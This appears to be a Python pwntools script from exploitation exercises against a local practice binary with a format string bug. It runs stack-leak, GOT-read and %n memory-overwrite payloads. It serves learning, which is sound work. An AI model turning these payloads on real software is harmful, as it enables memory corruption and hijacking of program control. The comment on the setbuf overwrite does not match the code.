

#!/usr/bin/env python3
from pwn import *
import sys
import struct

bin_file = './fsb_aarw'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)

libc = binf.libc
offset_libc_setbuf    = libc.functions['setbuf'].address	# libcのsetbuf()のアドレス

# ユーザの入力の位置確認
def attack_35_19(conn, **kwargs):
    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'
    conn.sendline(exploit)
    print(conn.recvall().decode())

# 設定した値の確認
def attack_35_20(conn, **kwargs):
    exploit = b'%9$p'.ljust(8, b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().decode())

# GOTの読み出し（%sをつけて読み出す）
def attack_35_21(conn, **kwargs):
    exploit = b'%9$s'.ljust(8, b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().hex())

# メモリ改竄
def attack_35_23(conn, **kwargs):
    #exploit = b'%258c%10$n'.ljust(0x10, b'\x00')
    #exploit += struct.pack('<Q', 0x404028)
    #conn.sendline(exploit)
    #print(conn.recvall().hex())

    overwrite = {offset_libc_setbuf : 0x102}				# exit()のGOTをmain()に書き換えるための辞書
    
    # 書式文字列攻撃用のペイロード作成
    """
    offset		：フォーマットストリングの「%n」がスタックの何番目にあるか（%x で調べる）
    writes		：書き込みたいアドレスと値の辞書（例：{0xdeadbeef: 0x41414141}）
    numbwritten	：すでに出力されたバイト数（printf の返り値）
    write_size	：'byte', 'short', 'int' のどれか。何バイトずつ書き込むか
    """
    exploit = fmtstr_payload(10, overwrite, numbwritten = 0, write_size = 'int')
    conn.sendline(exploit)
    print(conn.recvall().hex())

# メモリ改竄
def attack_35_27(conn, **kwargs):
    exploit = b'%13\$ln%86c%14\$hhn%34c%13\$hhn%4540c%15\$hn'.ljust(0x28,b'\x00')
    exploit += struct.pack('<QQQ', 0x404028, 0x404029, 0x40402A)
    conn.sendline(exploit)
    print(conn.recvall().hex())

def main():
    print('### attack_35_19 ###')
    conn = process(bin_file)
    attack_35_19(conn)
    
    print('### attack_35_20 ###')
    conn = process(bin_file)
    attack_35_20(conn)
    
    print('### attack_35_21 ###')
    conn = process(bin_file)
    attack_35_21(conn)
    
    print('### attack_35_23 ###')
    conn = process(bin_file)
    #conn = gdb.debug(bin_file)
    attack_35_23(conn)
    
    print('### attack_35_27 ###')
    conn = process(bin_file)
    #conn = gdb.debug(bin_file)
    attack_35_27(conn)
    
if __name__=='__main__':
    main()
